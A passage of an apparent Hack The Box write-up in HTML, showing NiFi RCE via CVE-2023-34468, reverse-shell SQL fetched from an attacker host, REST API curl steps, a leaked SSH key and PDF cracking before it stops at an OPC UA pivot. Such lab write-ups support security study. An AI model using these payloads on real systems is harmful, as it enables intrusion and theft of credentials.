@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>Helix &mdash; HTB Writeup // pr0ph3c</title>
+<meta name="description" content="Hack The Box: Helix (Medium · Linux) — Apache NiFi RCE (CVE-2023-34468), SSH lateral movement, and OPC UA ICS abuse to root. Writeup by pr0ph3c (Ish Bhatt)." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,700;1,400&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{--ink:#0d1117;--panel:#161b22;--panel2:#1c232c;--line:#222b35;--mute:#7d8a99;--soft:#aab6c2;--term:#00ff66;--crim:#ff3333;--amber:#ffb000;--blue:#4d9fff;color-scheme:dark;}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;max-width:100%;overflow-x:hidden;}
+body{background:var(--ink);color:var(--soft);font-family:"JetBrains Mono",ui-monospace,monospace;-webkit-font-smoothing:antialiased;max-width:100%;overflow-x:hidden;}
+::selection{background:rgba(0,255,102,.25);color:#eaffef;}
+::-webkit-scrollbar{width:9px;height:9px;}::-webkit-scrollbar-track{background:var(--ink);}::-webkit-scrollbar-thumb{background:var(--line);border:2px solid var(--ink);}::-webkit-scrollbar-thumb:hover{background:var(--term);}
+a{color:var(--term);}
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;background-image:linear-gradient(to right,rgba(0,255,102,.04) 1px,transparent 1px),linear-gradient(to bottom,rgba(0,255,102,.04) 1px,transparent 1px);background-size:44px 44px;-webkit-mask-image:radial-gradient(120% 80% at 50% 0,#000 30%,transparent 80%);mask-image:radial-gradient(120% 80% at 50% 0,#000 30%,transparent 80%);}
+.scan{position:fixed;inset:0;z-index:60;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0,rgba(0,0,0,0) 2px,rgba(0,0,0,.16) 3px,rgba(0,0,0,0) 4px);mix-blend-mode:multiply;}
+.topbar{position:fixed;top:0;left:0;right:0;height:52px;z-index:70;display:flex;align-items:center;justify-content:space-between;padding-left:max(14px,env(safe-area-inset-left));padding-right:max(14px,env(safe-area-inset-right));background:rgba(13,17,23,.85);backdrop-filter:blur(9px);border-bottom:1px solid var(--line);}
+.back{display:inline-flex;align-items:center;gap:8px;color:var(--soft);text-decoration:none;font-size:13px;}
+.back:hover{color:var(--term);}.back .arr{color:var(--term);}
+.tb-mid{font-size:12px;color:var(--mute);display:none;}@media(min-width:680px){.tb-mid{display:block;}}
+.tb-mid b{color:var(--soft);font-weight:500;}
+.pwned{display:flex;align-items:center;gap:10px;font-size:11px;color:var(--mute);}
+.flag{display:inline-flex;align-items:center;gap:5px;color:var(--term);}
+.flag::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--term);box-shadow:0 0 7px var(--term);}
+.progress{position:fixed;top:52px;left:0;height:2px;width:0;background:var(--term);box-shadow:0 0 9px var(--term);z-index:71;transition:width .08s linear;}
+.hero{position:relative;z-index:1;max-width:1120px;margin:0 auto;padding:96px 24px 22px;}
+.crumb{color:var(--term);font-size:12px;letter-spacing:.04em;margin-bottom:16px;}
+.title{font-family:"Space Grotesk",sans-serif;font-weight:700;font-size:clamp(46px,12vw,92px);line-height:.92;letter-spacing:-.03em;color:var(--soft);margin:0;position:relative;display:inline-block;text-shadow:0 0 22px rgba(0,255,102,.18);}
+.glitch::before,.glitch::after{content:attr(data-text);position:absolute;inset:0;overflow:hidden;opacity:.85;}
+.glitch::before{left:2px;text-shadow:-1px 0 var(--crim);animation:gt 3.6s infinite linear alternate-reverse;}
+.glitch::after{left:-2px;text-shadow:-1px 0 var(--term);animation:gb 2.8s infinite linear alternate-reverse;}
+@keyframes gt{0%,92%,100%{clip-path:inset(0 0 100% 0);}93%{clip-path:inset(0 0 35% 0);transform:translateX(-3px);}96%{clip-path:inset(12% 0 58% 0);transform:translateX(2px);}}
+@keyframes gb{0%,90%,100%{clip-path:inset(100% 0 0 0);}91%{clip-path:inset(70% 0 8% 0);transform:translateX(3px);}95%{clip-path:inset(54% 0 22% 0);transform:translateX(-2px);}}
+.subtitle{margin-top:14px;color:var(--mute);font-size:14px;}.subtitle b{color:var(--soft);font-weight:500;}
+.hero-meta{display:flex;flex-wrap:wrap;gap:8px;margin-top:20px;}
+.badge{font-size:11px;letter-spacing:.04em;text-transform:uppercase;padding:4px 11px;border:1px solid var(--line);color:#93a1ad;background:rgba(0,0,0,.25);}
+.badge.linux{color:var(--blue);border-color:rgba(77,159,255,.4);background:rgba(77,159,255,.07);}
+.badge.medium{color:var(--amber);border-color:rgba(255,176,0,.4);background:rgba(255,176,0,.07);}
+.badge.cve{color:var(--crim);border-color:rgba(255,51,51,.4);background:rgba(255,51,51,.07);}
+.badge.ics{color:var(--term);border-color:rgba(0,255,102,.4);background:rgba(0,255,102,.07);}
+/* kill chain */
+.chain{display:flex;flex-wrap:wrap;align-items:stretch;gap:10px;margin:30px 0 4px;}
+.chain-step{flex:1;min-width:150px;border:1px solid var(--line);background:rgba(22,27,34,.6);padding:14px 16px;}
+.ci{font-size:20px;margin-bottom:8px;filter:grayscale(.2);}
+.cl{font-family:"Space Grotesk",sans-serif;font-weight:600;color:var(--soft);font-size:14px;}
+.cd{font-size:11.5px;color:var(--mute);margin-top:3px;}
+.ca{display:flex;align-items:center;color:var(--term);font-size:22px;opacity:.5;}
+@media(max-width:720px){.ca{display:none;}.chain-step{min-width:calc(50% - 5px);}}
+/* layout */
+.layout{position:relative;z-index:1;max-width:1120px;margin:0 auto;padding:18px 24px 60px;display:grid;grid-template-columns:230px 1fr;gap:44px;}
+@media(max-width:980px){.layout{grid-template-columns:1fr;}.tocwrap{display:none;}}
+.tocwrap{position:sticky;top:78px;align-self:start;max-height:calc(100vh - 100px);overflow:auto;}
+.toctitle{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--mute);margin-bottom:10px;padding-left:12px;}
+.toc{display:flex;flex-direction:column;gap:1px;border-left:1px solid var(--line);}
+.toc a{color:var(--mute);text-decoration:none;font-size:12.5px;line-height:1.35;padding:7px 12px;border-left:2px solid transparent;margin-left:-1px;transition:.18s;display:flex;gap:8px;}
+.toc a .tn{color:var(--term);opacity:.6;}
+.toc a:hover{color:var(--soft);}
+.toc a.active{color:var(--term);border-left-color:var(--term);background:rgba(0,255,102,.05);}
+.toc a.active .tn{opacity:1;}
+/* article */
+.article{min-width:0;font-size:14.5px;line-height:1.78;color:#9aa7b4;}
+.wrap{max-width:100%;}
+.section{padding-top:18px;}
+.sec-hdr{display:flex;align-items:center;gap:14px;margin:54px 0 14px;padding-top:26px;border-top:1px solid var(--line);scroll-margin-top:88px;flex-wrap:wrap;}
+.section:first-of-type .sec-hdr{margin-top:6px;border-top:none;padding-top:0;}
+.phase{font-size:11px;letter-spacing:.1em;text-transform:uppercase;padding:4px 11px;border:1px solid var(--line);color:var(--term);background:rgba(0,255,102,.06);white-space:nowrap;}
+.p-cve{color:var(--crim);border-color:rgba(255,51,51,.35);background:rgba(255,51,51,.06);}
+.p-priv{color:var(--amber);border-color:rgba(255,176,0,.35);background:rgba(255,176,0,.06);}
+.sec-title{font-family:"Space Grotesk",sans-serif;font-weight:700;font-size:28px;color:var(--soft);}
+.article h3{font-size:17px;color:#ff6b6b;margin:32px 0 8px;font-family:"Space Grotesk",sans-serif;scroll-margin-top:88px;}
+.article h3::before{content:"## ";color:var(--mute);font-weight:400;font-family:"JetBrains Mono",monospace;}
+.article h4{font-size:13px;color:var(--soft);margin:22px 0 6px;text-transform:uppercase;letter-spacing:.07em;}
+.article h4::before{content:"$ ";color:var(--term);}
+.article p{margin:13px 0;}
+.article strong{color:var(--soft);font-weight:600;}
+.article em{color:#b6c2cd;}
+.article :not(pre):not(.cb-lang)>code{background:rgba(0,255,102,.08);color:#86ffb6;border:1px solid var(--line);padding:1px 6px;border-radius:2px;font-size:12.5px;word-break:break-word;}
+/* code blocks */
+.cb{margin:20px 0;border:1px solid var(--line);background:#0b0f14;}
+.cb-head{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;background:#11161d;border-bottom:1px solid var(--line);}
+.dots{display:flex;gap:6px;}.dots span{width:10px;height:10px;border-radius:50%;background:var(--line);}
+.dots span:nth-child(1){background:rgba(255,51,51,.6);}.dots span:nth-child(2){background:rgba(255,176,0,.6);}.dots span:nth-child(3){background:rgba(0,255,102,.6);}
+.cb-lang{font-size:11px;color:var(--term);letter-spacing:.04em;}
+.cb pre{margin:0;padding:14px 16px;overflow:auto;font-family:"JetBrains Mono",monospace;font-size:12.5px;line-height:1.6;color:#c4d0dc;white-space:pre;}
+/* port table */
+.ptable{border-collapse:collapse;width:100%;font-size:12.5px;margin:16px 0;display:block;overflow-x:auto;}
+.ptable th{background:rgba(0,255,102,.06);color:var(--term);text-align:left;padding:8px 12px;border:1px solid var(--line);font-weight:500;white-space:nowrap;}
+.ptable td{padding:8px 12px;border:1px solid var(--line);color:#9aa7b4;vertical-align:top;}
+.ptable .pn{color:var(--soft);font-weight:500;}.ptable .po{color:var(--term);}.ptable .ps{color:var(--blue);}
+/* key finding */
+.kf{display:flex;gap:14px;margin:22px 0;padding:14px 16px;border:1px solid var(--line);border-left:3px solid var(--term);background:rgba(0,255,102,.045);}
+.kf-icon{font-size:22px;line-height:1;}
+.kf-text strong{display:block;color:var(--term);font-size:12px;letter-spacing:.06em;text-transform:uppercase;margin-bottom:4px;}
+.kf-text{font-size:13.5px;color:#a4b3c0;}
+/* screenshot */
+.ss{margin:24px 0;border:1px solid var(--line);background:var(--panel);padding:10px;}
+.ss img{display:block;width:100%;height:auto;cursor:zoom-in;border:1px solid var(--line);background:#0b0f14;}
+.ss-cap{font-size:11px;color:var(--mute);margin-top:9px;text-align:center;letter-spacing:.03em;}
+/* callouts */
+.callout{margin:22px 0;padding:14px 16px;border:1px solid var(--line);border-left-width:3px;background:rgba(28,35,44,.45);font-size:13.5px;}
+.callout .c-ttl{font-size:11px;letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;font-weight:600;}
+.callout code{background:rgba(0,255,102,.08);color:#86ffb6;border:1px solid var(--line);padding:1px 6px;word-break:break-word;}
+.c-info{border-left-color:var(--blue);}.c-info .c-ttl{color:var(--blue);}
+.c-crit{border-left-color:var(--crim);background:rgba(255,51,51,.06);}.c-crit .c-ttl{color:var(--crim);}
+.c-tip{border-left-color:var(--amber);background:rgba(255,176,0,.05);}.c-tip .c-ttl{color:var(--amber);}
+.c-warn{border-left-color:var(--amber);background:rgba(255,176,0,.05);}.c-warn .c-ttl{color:var(--amber);}
+.repo{display:block;color:var(--term);text-decoration:none;font-size:12.5px;padding:5px 0;border-bottom:1px dashed var(--line);}
+.repo:last-child{border-bottom:none;}.repo:hover{color:#86ffb6;}
+/* cve card */
+.cve-card{margin:20px 0;border:1px solid rgba(255,51,51,.3);background:rgba(255,51,51,.04);padding:18px;}
+.cve-id{font-family:"Space Grotesk",sans-serif;font-weight:700;color:var(--crim);font-size:20px;}
+.cve-name{color:var(--soft);font-size:13.5px;margin-top:4px;}
+.cve-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1px;margin-top:16px;background:var(--line);border:1px solid var(--line);}
+.cve-item{background:var(--ink);padding:10px 13px;}
+.cve-item dt{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--mute);}
+.cve-item dd{color:var(--soft);font-size:13px;margin-top:3px;}
+.cve-item dd.crit{color:var(--crim);font-weight:600;}.cve-item dd.high{color:var(--amber);font-weight:600;}
+/* steps */
+.steps{margin:20px 0;display:flex;flex-direction:column;gap:1px;}
+.step{display:flex;gap:14px;padding:14px 16px;background:rgba(22,27,34,.5);border:1px solid var(--line);}
+.sn{flex:none;width:28px;height:28px;border:1px solid var(--term);color:var(--term);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600;}
+.st{font-family:"Space Grotesk",sans-serif;font-weight:600;color:var(--soft);font-size:14.5px;margin-bottom:4px;}
+.sb p{margin:0;font-size:13px;color:#9aa7b4;}
+/* lightbox */
+.lightbox{position:fixed;inset:0;z-index:100;background:rgba(5,8,11,.93);display:none;align-items:center;justify-content:center;padding:24px;cursor:zoom-out;}
+.lightbox.open{display:flex;}
+.lightbox img{max-width:95%;max-height:92%;border:1px solid var(--term);box-shadow:0 0 46px rgba(0,255,102,.22);}
+.foot{position:relative;z-index:1;border-top:1px solid var(--line);padding:28px 24px;text-align:center;color:var(--mute);font-size:12px;}
+.foot a{text-decoration:none;}.eof{color:rgba(0,255,102,.6);margin-top:6px;}
+@media(max-width:620px){
+  .hero{padding:80px 18px 18px;}.layout{padding:14px 18px 48px;}
+  .sec-title{font-size:23px;}.article h3{font-size:15.5px;}.article{font-size:14px;}
+  .cb pre{font-size:11.5px;}.tb-mid{display:none;}
+}
+@media(hover:none) and (pointer:coarse){.toc a{padding-top:10px;padding-bottom:10px;}}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="scan"></div>
+<div class="progress" id="progress"></div>
+
+<header class="topbar">
+  <a class="back" href="../../index.html#blogs"><span class="arr">&larr;</span> ~/blog</a>
+  <div class="tb-mid"><b>helix.htb</b> &middot; 10.129.245.123 &middot; Medium</div>
+  <div class="pwned"><span class="flag">user.txt</span><span class="flag">root.txt</span></div>
+</header>
+
+<section class="hero">
+  <div class="crumb">// writeups / helix.htb</div>
+  <h1 class="title glitch" data-text="HELIX">HELIX</h1>
+  <p class="subtitle"><b>Hack The Box</b> &middot; Apache NiFi RCE &rarr; SSH Key &rarr; OPC UA ICS Abuse &rarr; Root</p>
+  <div class="hero-meta">
+    <span class="badge linux">Linux</span>
+    <span class="badge medium">Medium</span>
+    <span class="badge cve">CVE-2023-34468</span>
+    <span class="badge ics">ICS / OPC UA</span>
+    <span class="badge">NiFi 1.21.0</span>
+    <span class="badge">Ubuntu 22.04</span>
+  </div>
+  <div class="chain">
+    <div class="chain-step"><div class="ci">&#128269;</div><div class="cl">Enumeration</div><div class="cd">Nmap + vhost fuzzing</div></div>
+    <div class="ca">&#8250;</div>
+    <div class="chain-step"><div class="ci">&#128165;</div><div class="cl">Initial Access</div><div class="cd">CVE-2023-34468 NiFi RCE</div></div>
+    <div class="ca">&#8250;</div>
+    <div class="chain-step"><div class="ci">&#128273;</div><div class="cl">Lateral Movement</div><div class="cd">SSH key + PDF crack</div></div>
+    <div class="ca">&#8250;</div>
+    <div class="chain-step"><div class="ci">&#9889;</div><div class="cl">Priv Escalation</div><div class="cd">OPC UA ICS abuse</div></div>
+  </div>
+</section>
+
+<div class="layout">
+  <aside class="tocwrap">
+    <div class="toctitle">$ cat ./toc</div>
+    <nav class="toc" id="toc">
+    <a href="#enum" data-target="enum"><span class="tn">01</span> Enumeration</a>
+    <a href="#cve" data-target="cve"><span class="tn">02</span> CVE-2023-34468</a>
+    <a href="#access" data-target="access"><span class="tn">03</span> Initial Access</a>
+    <a href="#lateral" data-target="lateral"><span class="tn">04</span> Lateral Movement</a>
+    <a href="#privesc" data-target="privesc"><span class="tn">05</span> Privilege Escalation</a>
+    </nav>
+  </aside>
+  <article class="article" id="article">
+<section class="section" id="enum">
+  <div class="wrap">
+    <div class="sec-hdr"><span class="phase p-enum">Phase 01</span><h2 class="sec-title">Enumeration</h2></div>
+
+    <h3>Network Reconnaissance &mdash; Nmap</h3>
+    <p>Starting with a version and service scan against the target to map out the initial attack surface.</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>nmap --privileged -sCV -T4 -oN helix.nmap 10.129.245.123
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/</pre>
+    </div>
+
+    <table class="ptable">
+      <thead><tr><th>Port</th><th>State</th><th>Service</th><th>Version / Notes</th></tr></thead>
+      <tbody>
+        <tr><td class="pn">22/tcp</td><td class="po">OPEN</td><td class="ps">SSH</td><td>OpenSSH 8.9p1 (Ubuntu 22.04)</td></tr>
+        <tr><td class="pn">80/tcp</td><td class="po">OPEN</td><td class="ps">HTTP</td><td>nginx 1.18.0 &mdash; redirects to <code>http://helix.htb/</code></td></tr>
+      </tbody>
+    </table>
+
+    <p>Two ports exposed externally. The HTTP server immediately redirects to a virtual hostname, indicating a vhost-aware nginx config. Vhost enumeration is the logical next step before probing the web application.</p>
+
+    <h3>Virtual Host Discovery &mdash; Gobuster</h3>
+    <p>Running Gobuster in vhost mode with <code>--append-domain</code> to discover subdomains served by the same nginx instance.</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>gobuster vhost \
+  --url http://helix.htb/ \
+  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  --append-domain
+
+===============================================================
+flow.helix.htb   Status: 200  [Size: 1068]</pre>
+    </div>
+
+    <div class="kf">
+      <div class="kf-icon">&#127919;</div>
+      <div class="kf-text">
+        <strong>Discovery</strong>
+        <code>flow.helix.htb</code> returns HTTP 200 and exposes an <strong>Apache NiFi 1.21.0</strong> data-flow management UI &mdash; accessible with no authentication and confirmed anonymous write access.
+      </div>
+    </div>
+
+    <div class="ss">
+      <img src="img1.png" loading="lazy" alt="Apache NiFi 1.21.0 running at flow.helix.htb">
+      <div class="ss-cap">Apache NiFi 1.21.0 at flow.helix.htb &mdash; About dialog confirms version; anonymous: True, canWrite: True</div>
+    </div>
+
+    <div class="callout c-info">
+      <div class="c-ttl">Why This Matters</div>
+      NiFi instances with anonymous write access are directly exploitable via CVE-2023-34468. No credentials are required &mdash; the attacker has full control of the dataflow canvas and can create controller services that execute arbitrary OS commands on the host.
+    </div>
+  </div>
+</section>
+
+<section class="section" id="cve">
+  <div class="wrap">
+    <div class="sec-hdr"><span class="phase p-cve">CVE Breakdown</span><h2 class="sec-title">CVE-2023-34468 &mdash; Apache NiFi RCE</h2></div>
+
+    <div class="cve-card">
+      <div class="cve-id">CVE-2023-34468</div>
+      <div class="cve-name">Apache NiFi &mdash; H2 JDBC URL Injection leading to Remote Code Execution</div>
+      <div class="cve-grid">
+        <dl class="cve-item"><dt>CVSS Score</dt><dd class="crit">8.8 HIGH</dd></dl>
+        <dl class="cve-item"><dt>Affected</dt><dd>NiFi 0.0.1 &ndash; 1.21.0</dd></dl>
+        <dl class="cve-item"><dt>Fixed In</dt><dd>NiFi 1.22.0+</dd></dl>
+        <dl class="cve-item"><dt>Component</dt><dd>DBCPConnectionPool</dd></dl>
+        <dl class="cve-item"><dt>Auth Required</dt><dd class="high">Write Access</dd></dl>
+        <dl class="cve-item"><dt>Attack Vector</dt><dd>Network</dd></dl>
+      </div>
+    </div>
+
+    <h3>What is Apache NiFi?</h3>
+    <p>Apache NiFi is a data-flow automation platform that lets operators visually build data pipelines by connecting "processor" nodes on a canvas. It is widely used in enterprise and OT/ICS environments to handle telemetry, sensor data, and log pipelines. Every aspect of the platform &mdash; creating processors, configuring controller services, starting and stopping flows &mdash; is controlled through a REST API.</p>
+
+    <h3>Root Cause Analysis</h3>
+    <p>NiFi ships with a built-in controller service called <strong>DBCPConnectionPool</strong>, which manages JDBC database connections. Users configure this service by supplying a JDBC connection URL string. NiFi accepts this URL and passes it directly to the underlying JDBC driver with <strong>no sanitisation or allowlist validation</strong>.</p>
+    <p>The H2 embedded database driver (bundled with NiFi) supports an <code>INIT</code> parameter in its connection URL that executes arbitrary SQL at connection time. H2 further exposes a <code>RUNSCRIPT FROM</code> SQL command that fetches and executes a remote SQL file. Because NiFi performs no validation, an attacker can inject a JDBC URL whose <code>INIT</code> parameter fetches an attacker-controlled SQL file containing OS commands &mdash; all triggered the moment the controller service is enabled.</p>
+
+    <div class="callout c-crit">
+      <div class="c-ttl">The Injected JDBC URL</div>
+      <code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://ATTACKER:8080/rce.sql'</code>
+      <br><br>
+      When the DBCPConnectionPool service is enabled, H2 opens this URL, fetches <code>rce.sql</code> from the attacker's HTTP server, and executes its contents. The SQL file calls <code>EXEC</code> to spawn a reverse shell running as the <code>nifi</code> OS user.
+    </div>
+
+    <h3>Why Write Access Is Sufficient</h3>
+    <p>NiFi's REST API enforces no secondary authentication for controller service creation. Any client with write permission &mdash; including the anonymous user when misconfigured &mdash; can create, configure, and enable controller services. The entire exploit chain is a sequence of authenticated API calls: no UI interaction, no additional privileges, no special configuration required on the attacker side beyond an HTTP server and a netcat listener.</p>
+
+    <h3>Manual Exploitation &mdash; Step by Step</h3>
+    <p>The following walkthrough demonstrates the exploit using only <code>curl</code> against the NiFi REST API, without the automated PoC script. This is the technique to internalise for manual testing, custom payloads, and bypassing PoC detections.</p>
+
+    <h4>Step 1 &mdash; Craft rce.sql</h4>
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">sql &mdash; rce.sql</span></div>
+      <pre>CREATE ALIAS IF NOT EXISTS EXEC AS $$ void exec(String cmd) throws Exception {
+    Runtime.getRuntime().exec(cmd);
+} $$;
+CALL EXEC('bash -c {echo,BASE64_ENCODED_REVSHELL}|{base64,-d}|bash');</pre>
+    </div>
+
+    <h4>Step 2 &mdash; Serve the file and open a listener</h4>
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre># Terminal 1: serve rce.sql over HTTP
+python3 -m http.server 8080
+
+# Terminal 2: reverse shell listener
+nc -nlvp 4444</pre>
+    </div>
+
+    <h4>Step 3 &mdash; Interact with the NiFi REST API</h4>
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre># 3a. Get root process group ID
+PG_ID=$(curl -s http://flow.helix.htb/nifi-api/flow/process-groups/root \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['processGroupFlow']['id'])")
+
+# 3b. Create DBCPConnectionPool with malicious JDBC URL
+CS_ID=$(curl -s -X POST http://flow.helix.htb/nifi-api/controller/controller-services \
+  -H 'Content-Type: application/json' \
+  -d "{
+    \"revision\": {\"version\": 0},
+    \"component\": {
+      \"type\": \"org.apache.nifi.dbcp.DBCPConnectionPool\",
+      \"name\": \"exploit\",
+      \"properties\": {
+        \"Database Connection URL\": \"jdbc:h2:mem:;INIT=RUNSCRIPT FROM 'http://10.10.17.35:8080/rce.sql'\",
+        \"Database Driver Class Name\": \"org.h2.Driver\",
+        \"database-driver-locations\": \"/opt/nifi-1.21.0/lib/h2-2.1.214.jar\",
+        \"Database User\": \"sa\",
+        \"Password\": \"\"
+      }
+    }
+  }" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+# 3c. Enable the service -- triggers INIT, fetches rce.sql, executes shell
+curl -s -X PUT "http://flow.helix.htb/nifi-api/controller/controller-services/${CS_ID}/run-status" \
+  -H 'Content-Type: application/json' \
+  -d "{\"revision\": {\"version\": 1}, \"state\": \"ENABLED\"}"</pre>
+    </div>
+
+    <div class="callout c-tip">
+      <div class="c-ttl">Public PoC and References</div>
+      <a class="repo" href="https://github.com/search?q=CVE-2023-34468&type=repositories" target="_blank" rel="noopener">&#8984; github.com &mdash; CVE-2023-34468 public exploit repositories</a>
+      <a class="repo" href="https://attackerkb.com/topics/DcMpSKzDuT/cve-2023-34468" target="_blank" rel="noopener">&#8984; attackerkb.com &mdash; CVE-2023-34468 technical analysis</a>
+      <a class="repo" href="https://nvd.nist.gov/vuln/detail/CVE-2023-34468" target="_blank" rel="noopener">&#8984; nvd.nist.gov &mdash; NVD entry</a>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="access">
+  <div class="wrap">
+    <div class="sec-hdr"><span class="phase p-init">Phase 02</span><h2 class="sec-title">Initial Access</h2></div>
+
+    <h3>Firing the PoC</h3>
+    <p>With the target confirmed exploitable &mdash; NiFi 1.21.0, anonymous write access &mdash; the automated PoC script handles the full API chain: creates the controller service, enables it, serves the SQL payload over HTTP, catches the reverse shell, then cleans up all artefacts from the flow canvas.</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>sudo python3 CVE-2023-34468_poc.py \
+  --target http://flow.helix.htb/ \
+  --lhost 10.10.17.35 \
+  --lport 4444 \
+  --cleanup \
+  --http-port 8080
+
+[*] Target: http://flow.helix.htb/ | LHOST: 10.10.17.35:4444 | HTTP: 8080
+[*] HTTP server up on :8080
+[*] Checking access...
+[+] Identity: anonymous | Anonymous: True | canWrite: True
+[+] Target is exploitable
+[*] Getting root process group ID...
+[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
+[*] Creating DBCPConnectionPool...
+[+] CS ID: 3ec52692-019e-1000-6793-619c71badafc
+[*] Enabling controller service...
+[+] Controller service enabled
+[+] rce.sql delivered to target  (x4)
+[*] Cleaning up...
+[+] Processor deleted | Controller service deleted</pre>
+    </div>
+
+    <h3>Shell as nifi &mdash; Credential Discovery</h3>
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>nc -nlvp 4444
+connect to [10.10.17.35] from (UNKNOWN) [10.129.245.123] 53294
+
+nifi@helix:/opt/nifi-1.21.0$ whoami
+nifi
+
+nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls
+operator_id_ed25519.bak
+
+nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
+ZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdY
+...
+-----END OPENSSH PRIVATE KEY-----</pre>
+    </div>
+
+    <div class="kf">
+      <div class="kf-icon">&#128215;</div>
+      <div class="kf-text">
+        <strong>Credential Found</strong>
+        An Ed25519 SSH private key named <code>operator_id_ed25519.bak</code> is sitting in NiFi's <code>support-bundles</code> directory. The filename directly implies ownership: system user <code>operator</code>.
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="lateral">
+  <div class="wrap">
+    <div class="sec-hdr"><span class="phase p-lat">Phase 03</span><h2 class="sec-title">Lateral Movement</h2></div>
+
+    <h3>Pivoting to the Operator Account</h3>
+    <p>Using the recovered private key to SSH directly into the <code>operator</code> user account from the attacker machine.</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>chmod 600 operator.key
+ssh -i operator.key operator@helix.htb
+
+operator@helix:~$ cat user.txt
+ac05beba4379e06f0d0e127c8743494c
+
+operator@helix:~$ ls
+"control systems diagram.png"
+"Operator Control &amp; Safety Guide.pdf"
+user.txt</pre>
+    </div>
+
+    <p>User flag captured. The home directory contains two additional files: a control systems diagram and a password-protected PDF manual titled <em>"Operator Control &amp; Safety Guide"</em>. The PDF title hints at ICS documentation worth cracking.</p>
+
+    <h3>Offline PDF Password Cracking</h3>
+    <p>Extracting the hash with <code>pdf2john</code> and running it through John against rockyou:</p>
+
+    <div class="cb">
+      <div class="cb-head"><div class="dots"><span></span><span></span><span></span></div><span class="cb-lang">bash</span></div>
+      <pre>pdf2john "Operator Control &amp; Safety Guide.pdf" &gt; hash.txt
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
+1g 0:00:01:04 DONE
+operator1   ("Operator Control &amp; Safety Guide.pdf")
+Session completed.</pre>
+    </div>
+
+    <div class="ss">
+      <img src="img2.png" loading="lazy" alt="Helix Industries Reactor Operations and Safety Logic Operator Guide">
+      <div class="ss-cap">Decrypted PDF: Helix Industries &mdash; Reactor Operations &amp; Safety Logic, Operator Guide (OPC UA-based PLC system documentation)</div>
+    </div>
+
+    <div class="ss">
+      <img src="img3.png" loading="lazy" alt="OPC UA architecture diagram showing writable control and reactor nodes">
+      <div class="ss-cap">OPC UA system architecture from the PDF &mdash; Calibration Offset, Mode, TestOverride, and ResetTrip are all writable by connected clients</div>
+    </div>
+
+    <p>The PDF reveals the internal OPC UA server architecture, the node IDs for all control registers, and critically &mdash; which ones accept writes from any connected client. This is the attack surface for privilege escalation.</p>
+
+    <h3>Internal Port and Service Discovery</h3>
+
+    <div class="ss">
+      <img src="img4.png" loading="lazy" alt="ss output showing local listeners including OPC UA port 4840">
+      <div class="ss-cap"><code>ss</code> output &mdash; port 4840 (OPC UA standard port) listening on 127.0.0.1, inaccessible from the external network</div>
+    </div>
+
+    <div class="ss">
+      <img src="img5.png" loading="lazy" alt="systemctl output showing helix-plc, helix-hmi, and helix-safety services">
+      <div class="ss-cap">Active systemd services &mdash; <code>helix-plc.service</code> (OPC UA), <code>helix-hmi.service</code>, and <code>helix-safety.service</code> which runs as root</div>
+    </div>
+
+    <div class="callout c-warn">
+      <div class="c-ttl">Pivot Identified</div>
+      Port 4840 is the OPC UA server, bound to localhost. The PDF documentation gives us the node IDs, their data types, and their write permissions. We now have everything required to talk to the industrial control layer directly.
+    </div>
+  </div>
